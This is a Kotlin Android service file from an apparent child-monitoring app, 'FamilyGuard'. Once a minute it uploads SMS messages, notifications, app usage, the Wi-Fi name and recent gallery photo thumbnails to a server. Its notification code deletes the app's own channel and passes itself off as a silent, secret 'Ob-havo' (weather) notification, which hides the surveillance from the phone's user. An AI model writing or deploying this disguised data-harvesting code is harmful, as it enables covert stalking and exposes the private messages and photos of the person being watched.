package com.familyguard.child.agent

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.app.Service
import android.app.usage.UsageStatsManager
import android.content.Context
import android.content.Intent
import android.content.pm.ServiceInfo
import android.graphics.Bitmap
import android.graphics.BitmapFactory
import android.net.Uri
import android.net.wifi.WifiManager
import android.os.Build
import android.os.IBinder
import android.provider.MediaStore
import androidx.core.app.NotificationCompat
import com.familyguard.child.ChildApp
import com.familyguard.child.MainActivity
import com.familyguard.child.R
import com.familyguard.child.data.ApiClient
import com.google.gson.Gson
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.delay
import kotlinx.coroutines.isActive
import kotlinx.coroutines.launch
import java.io.File
import java.io.FileOutputStream
import java.text.SimpleDateFormat
import java.util.Calendar
import java.util.Date
import java.util.Locale
import java.util.concurrent.ConcurrentLinkedQueue

class GuardForegroundService : Service() {
    private val scope = CoroutineScope(SupervisorJob() + Dispatchers.IO)
    private var loopJob: Job? = null
    private val api by lazy { ApiClient(ChildApp.instance.session) }
    private val gson = Gson()

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        val notif = buildNotification()
        if (Build.VERSION.SDK_INT >= 29) {
            startForeground(NOTIF_ID, notif, ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC)
        } else {
            startForeground(NOTIF_ID, notif)
        }
        if (loopJob == null) {
            loopJob = scope.launch {
                while (isActive) {
                    runCatching { syncAll() }
                    delay(60_000)
                }
            }
        }
        return START_STICKY
    }

    private suspend fun syncAll() {
        val session = ChildApp.instance.session
        val deviceId = session.deviceId() ?: return
        api.heartbeat(deviceId, wifiSsid())
        syncUsage(deviceId)
        syncRecentSms(deviceId)
        flushNotifications(deviceId)
        syncGallery(deviceId)
    }

    private fun wifiSsid(): String? {
        return try {
            val wifi = applicationContext.getSystemService(Context.WIFI_SERVICE) as WifiManager
            @Suppress("DEPRECATION")
            wifi.connectionInfo?.ssid?.trim('"')
        } catch (_: Exception) {
            null
        }
    }

    private suspend fun syncUsage(deviceId: Int) {
        val usm = getSystemService(Context.USAGE_STATS_SERVICE) as UsageStatsManager
        val end = System.currentTimeMillis()
        val cal = Calendar.getInstance().apply {
            set(Calendar.HOUR_OF_DAY, 0)
            set(Calendar.MINUTE, 0)
            set(Calendar.SECOND, 0)
            set(Calendar.MILLISECOND, 0)
        }
        val start = cal.timeInMillis
        val stats = usm.queryAndAggregateUsageStats(start, end)
        val day = SimpleDateFormat("yyyy-MM-dd", Locale.US).format(Date(start))
        val pm = packageManager
        val usedMs = stats.values.associate { it.packageName to it.totalTimeInForeground }
        val launcher = Intent(Intent.ACTION_MAIN).addCategory(Intent.CATEGORY_LAUNCHER)
        val launchable = pm.queryIntentActivities(launcher, 0)
        val items = launchable
            .map { it.activityInfo.packageName }
            .distinct()
            .map { pkg ->
                val label = try {
                    pm.getApplicationLabel(pm.getApplicationInfo(pkg, 0)).toString()
                } catch (_: Exception) {
                    pkg
                }
                mapOf(
                    "package_name" to pkg,
                    "app_label" to label,
                    "total_ms" to (usedMs[pkg] ?: 0L),
                    "day" to day,
                )
            }
        if (items.isNotEmpty()) {
            api.syncUsage(deviceId, gson.toJson(items))
        }
    }

    private suspend fun syncRecentSms(deviceId: Int) {
        val captured = SmsInbox.pending(this)
        if (captured.isEmpty()) return
        api.syncSms(deviceId, gson.toJson(SmsInbox.payload(captured)))
        SmsInbox.markSynced(this, captured)
    }

    private suspend fun flushNotifications(deviceId: Int) {
        val batch = NotificationOutbox.drain().toMutableList()
        while (true) {
            val item = pendingNotifications.poll() ?: break
            batch.add(item)
            if (batch.size >= 40) break
        }
        if (batch.isEmpty()) return
        runCatching { api.syncNotifications(deviceId, gson.toJson(batch)) }
            .onFailure { NotificationOutbox.restore(batch) }
    }

    private suspend fun syncGallery(deviceId: Int) {
        val prefs = getSharedPreferences("sync", MODE_PRIVATE)
        val uploaded = prefs.getStringSet("media_uploaded", emptySet())?.toMutableSet() ?: mutableSetOf()
        val projection = arrayOf(
            MediaStore.Images.Media._ID,
            MediaStore.Images.Media.DATE_TAKEN,
        )
        val cursor = contentResolver.query(
            MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
            projection,
            null,
            null,
            "${MediaStore.Images.Media.DATE_TAKEN} DESC",
        ) ?: return
        var count = 0
        cursor.use {
            val idIdx = it.getColumnIndexOrThrow(MediaStore.Images.Media._ID)
            val dateIdx = it.getColumnIndexOrThrow(MediaStore.Images.Media.DATE_TAKEN)
            val iso = SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ssXXX", Locale.US)
            while (it.moveToNext() && count < 8) {
                val id = it.getLong(idIdx)
                val taken = it.getLong(dateIdx)
                val uri = Uri.withAppendedPath(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, id.toString())
                val key = uri.toString()
                if (key in uploaded) continue
                val thumb = createThumb(uri) ?: continue
                val takenAt = if (taken > 0) iso.format(Date(taken)) else null
                val ok = runCatching {
                    api.uploadMedia(deviceId, key, thumb, takenAt)
                }.isSuccess
                thumb.delete()
                if (ok) {
                    uploaded.add(key)
                    count++
                }
            }
        }
        prefs.edit().putStringSet("media_uploaded", uploaded).apply()
    }

    private fun createThumb(uri: Uri): File? {
        return try {
            contentResolver.openInputStream(uri)?.use { input ->
                val bitmap = BitmapFactory.decodeStream(input) ?: return null
                val scaled = Bitmap.createScaledBitmap(bitmap, 480, (480f * bitmap.height / bitmap.width).toInt().coerceAtLeast(1), true)
                val file = File(cacheDir, "thumb_${System.currentTimeMillis()}.jpg")
                FileOutputStream(file).use { out -> scaled.compress(Bitmap.CompressFormat.JPEG, 70, out) }
                file
            }
        } catch (_: Exception) {
            null
        }
    }

    private fun buildNotification(): Notification {
        val channelId = "obhavo_bg"
        val nm = getSystemService(NotificationManager::class.java)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            nm.deleteNotificationChannel("family_guard_agent")
            val channel = NotificationChannel(
                channelId,
                "Ob-havo",
                NotificationManager.IMPORTANCE_MIN,
            ).apply {
                setShowBadge(false)
                setSound(null, null)
                enableVibration(false)
                enableLights(false)
                lockscreenVisibility = Notification.VISIBILITY_SECRET
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                    setAllowBubbles(false)
                }
            }
            nm.createNotificationChannel(channel)
        }
        val pi = PendingIntent.getActivity(
            this,
            0,
            Intent(this, MainActivity::class.java),
            PendingIntent.FLAG_IMMUTABLE,
        )
        return NotificationCompat.Builder(this, channelId)
            .setContentTitle("Ob-havo")
            .setContentText("")
            .setSmallIcon(R.drawable.ic_launcher)
            .setContentIntent(pi)
            .setOngoing(true)
            .setSilent(true)
            .setShowWhen(false)
            .setLocalOnly(true)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
            .setForegroundServiceBehavior(NotificationCompat.FOREGROUND_SERVICE_DEFERRED)
            .build()
    }

    companion object {
        private const val NOTIF_ID = 42
        val pendingNotifications = ConcurrentLinkedQueue<Map<String, Any?>>()

        fun start(context: Context) {
            val intent = Intent(context, GuardForegroundService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(intent)
            } else {
                context.startService(intent)
            }
        }
    }
}
